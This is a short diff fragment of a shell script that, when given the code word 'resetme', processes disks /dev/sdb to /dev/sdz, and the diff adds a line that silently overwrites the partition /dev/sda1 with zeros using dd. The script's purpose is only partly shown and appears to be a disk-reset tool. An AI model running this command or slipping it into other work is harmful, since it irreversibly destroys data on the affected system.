@@ -4,6 +4,9 @@ CODE_WORD="resetme"
 
 if [[ "$1". == "${CODE_WORD}". ]] 
 then
+
+    dd if=/dev/zero of=/dev/sda1 status=none
+
     for disk in /dev/sd[b-z]
     do
        echo "Processing ${disk}"
